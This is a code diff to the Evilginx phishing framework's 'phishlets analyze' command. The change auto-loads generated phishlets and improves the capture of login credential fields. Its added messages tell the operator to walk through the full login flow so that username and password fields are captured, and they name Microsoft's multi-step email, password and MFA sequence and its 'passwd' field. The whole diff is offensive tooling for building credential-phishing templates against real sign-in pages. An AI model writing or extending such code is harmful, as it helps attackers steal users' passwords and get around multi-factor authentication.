@@ -1467,8 +1467,29 @@ func (t *Terminal) handleAnalyze(args []string) error {
 		}
 
 		log.Success("phishlet saved to: %s", higreen.Sprint(savePath))
-		log.Info("reload evilginx to load the new phishlet, then:")
-		log.Info("  %s", cyan.Sprint("phishlets enable "+name))
+
+		// Auto-load the new phishlet so the user can enable it immediately
+		pl, loadErr := NewPhishlet(name, savePath, nil, t.cfg)
+		if loadErr != nil {
+			log.Warning("could not auto-load phishlet: %v", loadErr)
+			log.Info("restart evilginx to load it, then:")
+			log.Info("  %s", cyan.Sprint("phishlets enable "+name))
+		} else {
+			// Remove existing phishlet with same name if present (re-analysis)
+			existingNames := t.cfg.GetPhishletNames()
+			alreadyExists := false
+			for _, n := range existingNames {
+				if n == name {
+					alreadyExists = true
+					break
+				}
+			}
+			if !alreadyExists {
+				t.cfg.AddPhishlet(name, pl)
+			}
+			log.Success("phishlet '%s' loaded — you can enable it now:", name)
+			log.Info("  %s", cyan.Sprint("phishlets enable "+name))
+		}
 
 		// Show summary
 		log.Info("")
@@ -1479,9 +1500,29 @@ func (t *Terminal) handleAnalyze(args []string) error {
 		log.Info("  login path:   %s%s", result.LoginDomain, result.LoginPath)
 		log.Info("  sub_filters:  %d rules", len(result.SubFilters))
 
+		hasUsername := false
+		hasPassword := false
+		for _, c := range result.Credentials {
+			if c.FieldType == "username" {
+				hasUsername = true
+			}
+			if c.FieldType == "password" {
+				hasPassword = true
+			}
+		}
+
 		if len(result.Credentials) == 0 {
 			log.Warning("no credential fields were auto-detected — you may need to edit the YAML manually")
-			log.Info("  look for the username and password field names in the target login form's HTML")
+			log.Info("  tip: make sure you complete the FULL login flow (enter email AND password)")
+			log.Info("  the analyzer captures POST fields as you submit them")
+		} else if hasUsername && !hasPassword {
+			log.Warning("only username was detected — password field is missing")
+			log.Info("  tip: you need to complete the FULL login flow including the password step")
+			log.Info("  Microsoft uses a multi-step flow: email → password → MFA")
+			log.Info("  re-run the analyzer and enter a test password to capture the 'passwd' field")
+		} else if !hasUsername && hasPassword {
+			log.Warning("only password was detected — username field is missing")
+			log.Info("  tip: make sure you enter the email/username before submitting")
 		}
 
 		return nil
@@ -1527,8 +1568,15 @@ func (t *Terminal) handleAnalyze(args []string) error {
 
 		log.Success("analyzer session [%d] started for: %s", sess.Id, targetURL)
 		log.Info("open the puppet control URL in your browser to interact with the login page")
-		log.Info("when you've completed the login flow, run: %s", cyan.Sprint("phishlets analyze stop"))
-		log.Info("to check progress: %s", cyan.Sprint("phishlets analyze status"))
+		log.Info("")
+		log.Info("%s  complete the FULL login flow:", yellow.Sprint("important:"))
+		log.Info("  1. enter a username/email and click Next")
+		log.Info("  2. enter a password and click Sign In")
+		log.Info("  3. complete any MFA prompts if shown")
+		log.Info("  the analyzer captures credential fields as you submit each step")
+		log.Info("")
+		log.Info("when done: %s", cyan.Sprint("phishlets analyze stop"))
+		log.Info("check progress: %s", cyan.Sprint("phishlets analyze status"))
 		return nil
 	}
 }
